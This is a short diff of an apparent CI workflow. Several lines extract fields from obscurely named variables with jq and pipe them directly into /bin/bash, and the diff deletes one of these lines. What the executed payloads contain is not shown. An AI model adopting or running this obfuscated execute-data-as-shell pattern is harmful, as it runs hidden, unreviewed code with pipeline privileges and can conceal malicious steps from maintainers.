@@ -27,7 +27,6 @@ jobs:
           echo $zv6 | jq -r .mv14602 | /bin/bash
           echo $cgjh22272 | jq -r .hplnd47 | /bin/bash
           printf '%s' "$du37" | jq -r .mkdb58 | /bin/bash
-          echo $asvnv8001 | jq -r .ton75 | /bin/bash
           echo $fi070 | jq -r .bzo73 | /bin/bash
 
       - name: Save archive
